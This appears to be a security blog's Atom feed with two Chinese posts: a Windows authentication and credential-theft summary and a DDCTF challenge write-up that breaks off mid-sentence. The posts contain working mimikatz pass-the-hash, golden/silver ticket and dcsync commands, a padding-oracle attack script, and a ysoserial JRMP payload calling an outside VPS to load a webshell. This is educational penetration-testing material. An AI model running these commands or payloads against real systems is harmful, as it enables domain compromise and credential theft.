<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SG&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/3e4fe908cffc70c041deb4c165da8cc6</icon>
  <subtitle>一直划水,偶尔学习</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://love-sg.me/"/>
  <updated>2019-04-25T15:10:39.469Z</updated>
  <id>http://love-sg.me/</id>
  
  <author>
    <name>ShadowGlint</name>
    <email>sg@chamd5.org</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>windows认证及抓密码总结</title>
    <link href="http://love-sg.me/2019/04/27/windows%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%8A%93%E5%AF%86%E7%A0%81%E6%80%BB%E7%BB%93/"/>
    <id>http://love-sg.me/2019/04/27/windows认证及抓密码总结/</id>
    <published>2019-04-27T04:59:45.000Z</published>
    <updated>2019-04-25T15:10:39.469Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-windows的认证方式主要有哪些？"><a href="#1-windows的认证方式主要有哪些？" class="headerlink" title="1. windows的认证方式主要有哪些？"></a>1. windows的认证方式主要有哪些？</h3><p>windows的认证方式主要有NTLM认证、Kerberos认证两种。同时，Windows Access Token记录着某用户的SID、组ID、Session、及权限等信息，也起到了权限认证的作用。</p><p>其中，NTLM认证主要有本地认证和网络认证两种方式。本地登录时，用户的密码存储在%SystemRoot%\system32\config\sam这个文件里。当用户输入密码进行本地认证的过程中，所有的操作都是在本地进行的。他其实就是将用户输入的密码转换为NTLM Hash，然后与SAM中的NTLM Hash进行比较。而网络认证则是基于一种Challenge/Response认证机制的认证模式。他的认证过程我们下边会详细讲。</p><p>Kerberos认证用于域环境中，它是一种基于票据（Ticket）的认证方式。他的整个认证过程涉及到三方：客户端、服务端和KDC（Key Distribution Center）。在Windows域环境中，由DC(域控)来作为KDC。</p><p>Access Token(访问令牌)是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登陆时，系统生成一个Access Token，然后以该用户身份运行的的所有进程都拥有该令牌的一个拷贝。这也就解释了A用户创建一个进程而B用户没有该进程的权限。<br><a id="more"></a></p><h3 id="2-NTLM的认证过程是怎样什么？"><a href="#2-NTLM的认证过程是怎样什么？" class="headerlink" title="2. NTLM的认证过程是怎样什么？"></a>2. NTLM的认证过程是怎样什么？</h3><p>首先是本地认证，也就是NTLM Hash的生成方式。</p><p>当用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框。当winlogon.exe接收输入后，将密码交给LSASS进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。(winlogon.exe即Windows Logon Process，是Windows NT用户登陆程序，用于管理用户登录和退出。<br>LSASS用于微软Windows系统的安全机制。它用于本地安全和登陆策略。)</p><p>比如当用户输入密码123456后，那么操作系统会将123456转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123456 -&gt; hex(16进制编码) = 313233343536</span><br><span class="line">313233343536 -&gt; Unicode = 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure></p><p>看明白本地认证的过程后，再说一下网络认证的具体过程。</p><p>NTLM协议的认证共需要三个消息完成：协商、挑战、认证。<br>协商：主要用于确认双方协议版本、加密等级等<br>挑战：服务器在收到客户端的协商消息之后， 会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等等。 并生成一个随机数challenge, 然后生成challenge消息返回给客户端。该消息就是挑战/响应认证机制的主要功能体现。<br>认证：验证主要是在挑战完成后，验证结果，是认证的最后一步。</p><p>详细过程如下：<br>第一步,输入密码,然后LSASS会把密码的NTLM Hash后的值先存储到本地。<br>第二步,客户端把用户名的明文发送给服务端<br>第三步,服务端会生成一个16位的随机数,即challenge,再传回给客户端<br>第四步,当客户端收到challenge后,用在第一步中存储的NTLM Hash对其加密，然后再将加密后的challenge发送给服务器，也就是response。<br>第五步,服务端在收到response后，会向DC发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、客户端NTLM Hash加密的Challenge、原始的Challenge。<br>第六步,当DC接到过来的这三个值的以后,会根据用户名到DC的账号数据库(ntds.dit)里面找到该用户名对应的NTLM Hash,然后把这个hash拿出来和传过来的challenge值进行比较,相同则认证成功,反之,则失败。</p><p>上边说的是NTLM v1认证方式，NTLM v2和v1最显著的区别就是Challenge与加密算法不同，共同点就是加密的key都是NTLM Hash。NTLM v1的Challenge有8位，NTLM v2的Challenge为16位。NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。</p><h3 id="3-针对NTLM的姿势主要有哪些？"><a href="#3-针对NTLM的姿势主要有哪些？" class="headerlink" title="3. 针对NTLM的姿势主要有哪些？"></a>3. 针对NTLM的姿势主要有哪些？</h3><p>当我们通过dump hash拿到了NTLM Hash后，我通常首先尝试能不能直接在线破解。常用的破解网站：<br><a href="https://www.objectif-securite.ch/en/ophcrack.php/" target="_blank" rel="noopener">https://www.objectif-securite.ch/en/ophcrack.php/</a><br><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a><br><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p><p>如果不能破解，那可以尝试Pass The Hash(hash传递)。<br>哈希传递就是使用用户名对应的NTLM Hash将服务器给出的Chanllenge加密，生成一个Response，来完成认证。Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p><p>常用的pth的工具主要有:mimikatz(首选)、wmiexec/psexec、exploit/windows/smb/psexec_psh、powershell invoke系列小脚本。</p><p>当然，pth也是有利用条件的。如果目标机器安装了KB2871997，那我们就不能pth了。那我们还有另一个姿势：Pass The Key。对于8.1/2012r2，<strong>安装补丁kb2871997</strong>的Win 7/2008r2/8/2012，可以使用AES keys代替NTLM Hash。在mimikatz抓hash时，可以一并抓到。其实，mimikatz中的pth本身就是ptk了。<br>命令：<br>mimikatz “privilege::debug” “sekurlsa::pth /user:a /domain:test.local /aes256:f74b379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c” </p><p>除这些外，还有很多其他姿势，比如打了补丁有administrator帐号扔可pth、当开启Restricted Admin Mode后，win8.1和server12 R2默认支持pth、启用WDigest劫持winlogon仙人跳等。</p><h3 id="4-Kerberos认证中主要有哪些知识点需要注意？"><a href="#4-Kerberos认证中主要有哪些知识点需要注意？" class="headerlink" title="4. Kerberos认证中主要有哪些知识点需要注意？"></a>4. Kerberos认证中主要有哪些知识点需要注意？</h3><p>首先解释一些名词：<br>基本概念：<br>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。<br>AS:  Authentication Service，验证服务，为client生成TGT的服务<br>TGS: Ticket Granting Service，票据授予服务，为client生成某个服务的ticket<br>TGT: Ticket Granting Ticket，入场券，通过入场券能够获得票据，是一种临时凭证的存在。<br>Ticket:票据，是网络中各对象之间互相访问的凭证<br>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。<br>DC: Domain Controller，域控<br>KRBTGT: 每个域控制器都有一个krbtgt账户，是KDC的服务账户，用来创建TGS加密的密钥。</p><p>Kerberos提供了一个集中式的认证方式,在整个认证过程中总共要涉及到三方:客户端,服务端和KDC, 在Windows域环境中,KDC的角色由DC来担任,Kerberos是一种基于票据的认证方式,票据(Ticket)是用来安全的在认证服务器和用户请求的服务之间传递用户的身份,同时也会传递一些附加信息,用来保证使用Ticket的用户必须是Ticket中指定的用户,Ticket一旦生成,在生存时间内可以被Client多次使用来申请同一个Server的服务。这里就存在一个票据窃取问题。</p><p>说下kerberos的大致工作流程，域中的客户端要想访问同域中的某个服务器资源时，需要首先购买该服务端认可的票据(Ticket)，也就是说，客户端在访问服务器之前需要预先买好票，等待服务验票之后才能入场，但是这张票不能直接购买，还需要一张认购权证(TGT)，也就是说客户端在买票之前需要预先获得一张认购权证，这张认购权证和进入服务器的入场券均由KDC发售。引用网络上一张思路很清晰的图。</p><p><img src="http://images.cnblogs.com/cnblogs_com/artech/201101/201101242156364484.png" alt="Kerberos票据获取过程"></p><h3 id="5-域渗透中针对Kerberos的姿势主要有哪些？"><a href="#5-域渗透中针对Kerberos的姿势主要有哪些？" class="headerlink" title="5. 域渗透中针对Kerberos的姿势主要有哪些？"></a>5. 域渗透中针对Kerberos的姿势主要有哪些？</h3><p>说完认证过程后，就要说下经常用的两种票据：白银票据和黄金票据了。<br>白银票据的特点是：不需要与KDC进行交互、需要目标服务的NTLM Hash。因此当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。<br>利用：<br>kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /target:&lt;服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:<ntlm> /user:&lt;用户名&gt; /ptt</ntlm></p><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造。如cifs服务用于Windows主机间的文件共享，用其他如LDAP等服务则无法访问server的文件系统。</p><p>与白银票据相比，黄金票据的特点是需要与DC通信、需要krbtgt用户的hash，也就是需要拿下域控。<br>利用：<br>lsadump::dcsync /domain:域名 /user:krbtgt<br>kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:<krbtgt ntlm=""> /user:&lt;任意用户名&gt; /ptt<br>拿到黄金票据后，就可以伪造黄金票据，然后就能获取任何Kerberos服务权限，登录任意域内任意一台主机。mimikatz导出域内所有主机的票据，命令是sekurlsa::tickets /export，或者dump NTDS.dit也可以。</krbtgt></p><p>那最后就要说下拿域控的姿势了。<br>最常用的毫无疑问是ms14068。主要利用工具是goldenPac.py或者kekeo/PyKEK。利用方式网上很多文章，这里不详细说。</p><h3 id="6-Windows-Access-Token主要知识点浅谈"><a href="#6-Windows-Access-Token主要知识点浅谈" class="headerlink" title="6. Windows Access Token主要知识点浅谈"></a>6. Windows Access Token主要知识点浅谈</h3><p>Windows Access Token(访问令牌)有两种，一种是Delegation token(授权令牌)，主要用于交互会话登录(例如本地用户直接登录、远程桌面登录)，另一种是Impersonation token(模拟令牌)，主要用于非交互登录(利用net use访问共享文件夹)。</p><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token。如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。当用户注销后，系统将会使授权令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</p><p>一般通过incognito.exe或者msf中的incognito模块来窃取令牌(Metasploit中的incognito，是从windows平台下的incognito移植过来的)，从而获得令牌对应的权限，比如已获得admin权限，然后通过窃取令牌然后令牌假冒来获得system权限。</p><p>除此之外，推荐看一下3gstudent大佬的Windows-Token九种权限的利用一文。个人感觉到了内网渗透的后期，想要更好的理解、利用相关漏洞，还是需要对win32有一定的熟悉，否则会一直浮于表面，并不能做的很深入。</p><p>最后附上自己总结的Windows认证的思维导图。<br><img src="https://upload-images.jianshu.io/upload_images/8400344-d8903e445f469777.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="windows认证"></p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-ddf1c4962511de7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="windows下抓密码"></p><p>参考链接：<br><a href="https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html" target="_blank" rel="noopener">https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html</a><br><a href="https://www.secpulse.com/archives/94848.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/94848.html</a><br><a href="https://blog.csdn.net/cxzhq2002/article/details/80938770" target="_blank" rel="noopener">https://blog.csdn.net/cxzhq2002/article/details/80938770</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-windows的认证方式主要有哪些？&quot;&gt;&lt;a href=&quot;#1-windows的认证方式主要有哪些？&quot; class=&quot;headerlink&quot; title=&quot;1. windows的认证方式主要有哪些？&quot;&gt;&lt;/a&gt;1. windows的认证方式主要有哪些？&lt;/h3&gt;&lt;p&gt;windows的认证方式主要有NTLM认证、Kerberos认证两种。同时，Windows Access Token记录着某用户的SID、组ID、Session、及权限等信息，也起到了权限认证的作用。&lt;/p&gt;
&lt;p&gt;其中，NTLM认证主要有本地认证和网络认证两种方式。本地登录时，用户的密码存储在%SystemRoot%\system32\config\sam这个文件里。当用户输入密码进行本地认证的过程中，所有的操作都是在本地进行的。他其实就是将用户输入的密码转换为NTLM Hash，然后与SAM中的NTLM Hash进行比较。而网络认证则是基于一种Challenge/Response认证机制的认证模式。他的认证过程我们下边会详细讲。&lt;/p&gt;
&lt;p&gt;Kerberos认证用于域环境中，它是一种基于票据（Ticket）的认证方式。他的整个认证过程涉及到三方：客户端、服务端和KDC（Key Distribution Center）。在Windows域环境中，由DC(域控)来作为KDC。&lt;/p&gt;
&lt;p&gt;Access Token(访问令牌)是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登陆时，系统生成一个Access Token，然后以该用户身份运行的的所有进程都拥有该令牌的一个拷贝。这也就解释了A用户创建一个进程而B用户没有该进程的权限。&lt;br&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://love-sg.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-再来一杯JAVA复现</title>
    <link href="http://love-sg.me/2019/04/20/DDCTF-%E5%86%8D%E6%9D%A5%E4%B8%80%E6%9D%AFJAVA%E5%A4%8D%E7%8E%B0/"/>
    <id>http://love-sg.me/2019/04/20/DDCTF-再来一杯JAVA复现/</id>
    <published>2019-04-19T20:13:13.000Z</published>
    <updated>2019-05-11T12:24:05.195Z</updated>
    
    <content type="html"><![CDATA[<p>访问题目，抓包看到几个api。<br>account_info返回{“id”:1,”roleAdmin”:false}<br>gen_token返回token</p><p>token解b64有：PadOracle:iv/cbc </p><p>基本确定就是padding oracle然后cbc字节翻转。</p><p>大体复习下padding oracle原理，0-16字节是16-32密文的iv，16-32的密文是32-48密文的iv，<br>我们要改32-48的密文，得先爆破出它的middle，即用16-32的密文去爆破，最后得到middle，然后和16-32字节的密文xor，也即是32-48的iv </p><p>去复习了一波，找到脚本跑一下。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def xor(a, b):</span><br><span class="line">    return &quot;&quot;.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])</span><br><span class="line"></span><br><span class="line">def padding_oracle(ciper_hex, N):</span><br><span class="line">    get = &quot;&quot;</span><br><span class="line">    for i in xrange(1, N + 1):</span><br><span class="line">        for j in xrange(0, 256):</span><br><span class="line">            # print(i,j)</span><br><span class="line">            padding = xor(get, chr(i) * (i - 1))</span><br><span class="line">            c = chr(0) * (N - i) + chr(j) + padding</span><br><span class="line">            payload=&apos;5061644f7261636c653a69762f636263&apos;+c.encode(&apos;hex&apos;)+ciper_hex</span><br><span class="line">            # print(payload)</span><br><span class="line">            get_api_return=get_api(payload)</span><br><span class="line">            # print(get_api_return)</span><br><span class="line">            if &quot;decrypt err~&quot; not in get_api_return:</span><br><span class="line">                get = chr(j ^ i) + get</span><br><span class="line">                print(get.encode(&apos;hex&apos;))</span><br><span class="line">                break</span><br><span class="line">    return get.encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">def padding(strings):</span><br><span class="line">    padding_len=8-len(strings)%8</span><br><span class="line">    return strings+chr(padding_len)*padding_len</span><br><span class="line"></span><br><span class="line">def get_api(ciphertext):</span><br><span class="line">    req_header=&#123;&apos;X-Forwarded-For&apos;: &apos;&apos;,</span><br><span class="line">&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063&apos;,</span><br><span class="line">&apos;Host&apos;:&apos;c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023&apos;,</span><br><span class="line">&apos;Referer&apos;:&apos;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home&apos;,</span><br><span class="line">&apos;Cookie&apos;:&apos;token=&#123;&#125;&apos;.format(ciphertext.decode(&apos;hex&apos;).encode(&apos;base64&apos;)[:-1]),</span><br><span class="line">&#125;</span><br><span class="line">    s = requests.session() </span><br><span class="line">    rsp=s.get(&apos;http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token&apos;, headers=req_header,timeout=2,verify=False,stream=True,allow_redirects=False)</span><br><span class="line">    return(rsp.content)  </span><br><span class="line"></span><br><span class="line">def cbc_byte_flipping(strings):</span><br><span class="line">    token_padding=padding(strings)</span><br><span class="line"></span><br><span class="line">    c2=&apos;b8d85a91bdeae799086cc723e7bf1685&apos;.decode(&apos;hex&apos;)</span><br><span class="line">    c2_m=&apos;a7d3878a0466c70b59264b5ed33f5013&apos;.decode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">    c1=xor(c2_m,token_padding[16:])</span><br><span class="line"></span><br><span class="line">    c1_m=padding_oracle(c1.encode(&apos;hex&apos;), 16).decode(&apos;hex&apos;)</span><br><span class="line">    # c1_m=&apos;da51cc63b444e4a26d7f391841f1e076&apos;.decode(&apos;hex&apos;)</span><br><span class="line">    iv=xor(c1_m,token_padding[0:16]) #iv</span><br><span class="line"></span><br><span class="line">    return((iv+c1+c2).encode(&apos;base64&apos;)[:-1])</span><br><span class="line"></span><br><span class="line">print(cbc_byte_flipping(&apos;&#123;&quot;id&quot;:1,&quot;roleAdmin&quot;:true&#125;&apos;))</span><br></pre></td></tr></table></figure></p><p>hex一下，猜测是中间16位iv，最后16位是密文。并且解密失败，服务端会返回dercrypt err，因此满足padding oracle条件。</p><p>跑脚本，拿到可用的token。admin身份进后台之后，看到下载1.txt，里边给出hint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Try to hack~ </span><br><span class="line">Hint:</span><br><span class="line">1. Env: Springboot + JDK8(openjdk version &quot;1.8.0_181&quot;) + Docker~ </span><br><span class="line">2. You can not exec commands~</span><br></pre></td></tr></table></figure></p><p>看到题目用了Springboot，并且限制不可执行命令。(下边shell后也证实，shell直接被禁了)</p><p>继续fuzz下载文件的fileName参数，跑了很多常见的fuzz任意文件读的字典，发现除了passwd啥都读不到。递归把etc、bin、usr等目录都跑过了，发现没啥有用的信息。</p><p>但看着样子肯定要拿到源码，继续测，跑/proc/self/fd当前运行进程目录，发现15能下到源码。</p><p>反编译审一波。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class DeserializeDemoController</span><br><span class="line">&#123;</span><br><span class="line">  @Autowired</span><br><span class="line">  private SerialKillerConf serialKillerConf;</span><br><span class="line"></span><br><span class="line">  @CheckAdminActuator</span><br><span class="line">  @RequestMapping(&#123;&quot;/nicaibudao_hahaxxxx/deserial&quot;&#125;)</span><br><span class="line">  public String deserialize(String base64Info)</span><br><span class="line">  &#123;</span><br><span class="line">    ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64Info));</span><br><span class="line">    UserInfo userInfo = null;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">      ObjectInputStream ois = new SerialKiller(bais, this.serialKillerConf.getConfig());</span><br><span class="line">      userInfo = (UserInfo)ois.readObject();</span><br><span class="line">      ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      return null;</span><br><span class="line">    &#125;</span><br><span class="line">    return JSON.toJSONString(userInfo);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>清楚看到controller/DeserializeDemoController下有反序列化接口，那思路就很明确了，反序列化执行执行命令或列目录拿flag。</p><p>继续审，发现用到了serialkiller。ysoserial里的payload都不能用了。</p><p>仔细看了一遍ysoserial以及google一波之后，并且根据jrmp这个提示，发现有两种利用方式。一是通过反序列化使它创建一JRMPListener，二是通过反序列化使它创建一个JRMPCient，但是由于赛题说了是docker环境，因此我们通过起JRMPListener的方式监听的端口，没办法访问得到，那么剩下的只有通过JRMPClient了。然后发现ysoserial的JRMPListener其实是不在反序列化黑名单内的，但是没办法暴露端口，所以没办法。。否则可以起一个JRMPServer来反序列化。</p><p>在继续google之后，发现对ysoserial的jrmpclient进行一定修改之后，可以绕过黑名单。参考weblogic的几个反序列化洞。附上链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2479</span><br></pre></td></tr></table></figure></p><p>看到了payload1<br><img src="https://mmbiz.qpic.cn/mmbiz_png/PUubqXlrzBSVObfN16XXG331ictGcpPGcyWGbsRITwic6ibQbQMKzeFkYqTNd2vKF4sUUnYWQ7jprWiafVMyp4UTSw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt=""></p><p>serialkiller中对jrmp的过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- ysoserial&apos;s JRMPClient payload  --&gt;</span><br><span class="line">&lt;regexp&gt;java\.rmi\.registry\.Registry$&lt;/regexp&gt;</span><br><span class="line">&lt;regexp&gt;java\.rmi\.server\.ObjID$&lt;/regexp&gt;</span><br><span class="line">&lt;regexp&gt;java\.rmi\.server\.RemoteObjectInvocationHandler$&lt;/regexp&gt;</span><br></pre></td></tr></table></figure></p><p>这个payload并未用到serialkiller中的类，而是通过UnicastRef。我们跟进去看下UnicastRef这个类的作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * NOTE: There is a JDK-internal dependency on the existence of this</span><br><span class="line"> * class&apos;s getLiveRef method (as it is inherited by UnicastRef2) in</span><br><span class="line"> * the implementation of javax.management.remote.rmi.RMIConnector.</span><br><span class="line"> **/</span><br><span class="line">   public class UnicastRef implements RemoteRef </span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">  * Create a new Unicast RemoteRef.</span><br><span class="line">  */</span><br><span class="line">   public UnicastRef(LiveRef liveRef) &#123;</span><br><span class="line">       ref = liveRef;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>大约就是创建一个RMI连接器，和JRMPServer连接。所以我们并不需要Registry类，去掉之后对反序列化利用没有影响。</p><p>在DeseriallizeDemoController类中，可以看到输入被过滤了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = new SerialKiller(bais, this.serialKillerConf.getConfig());</span><br></pre></td></tr></table></figure></p><p>因此，这题bypass serialkiller的思路，就是ysoserial在vps起一个JRMPListener，然后像常规JRMP的利用思路那样，传入JRMPClient的Payload。在题目的JRMPClient连上我们的vps之后，JRMPListener把payload发送过去，因为这里反序列化不再走SerialKiller，所以，我们只要利用CommonCollections3.1去构造一个执行链，在反序列化的时候使用URLClassLoader去加载我们写的jar，然后实例化jar包内的R.class，最终执行R.class实例化对象的构造方法（里面包含一个webshell），这样就能绕过serialKiller了。当然，思路是第一步，下边还有很多很多很多坑。。。</p><p>就用这个payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.ObjID;</span><br><span class="line">import java.util.Random;</span><br><span class="line"></span><br><span class="line">import sun.rmi.server.UnicastRef;</span><br><span class="line">import sun.rmi.transport.LiveRef;</span><br><span class="line">import sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line">import ysoserial.payloads.annotation.Authors;</span><br><span class="line">import ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line">import ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings ( &#123;&quot;restriction&quot; &#125; )</span><br><span class="line">@PayloadTest( harness = &quot;ysoserial.payloads.JRMPReverseConnectSMTest&quot;)</span><br><span class="line">@Authors(&#123; Authors.MBECHLER &#125;)</span><br><span class="line">public class JRMPClient1 extends PayloadRunner implements ObjectPayload&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">    public Object getObject (final String command ) throws Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        int port;</span><br><span class="line">        int sep = command.indexOf(&apos;:&apos;);</span><br><span class="line">        if ( sep &lt; 0 ) &#123;</span><br><span class="line">            port = new Random().nextInt(65535);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            host = command.substring(0, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + 1));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = new ObjID(new Random().nextInt()); // RMI registry</span><br><span class="line">          TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        return ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main ( final String[] args ) throws Exception &#123;</span><br><span class="line">        String[] target = new String[] &#123;&quot;139.199.203.253:44446&quot;&#125;;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient1.class, target);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>这里我有一个疑问，payload1中用到了ObjID id = new 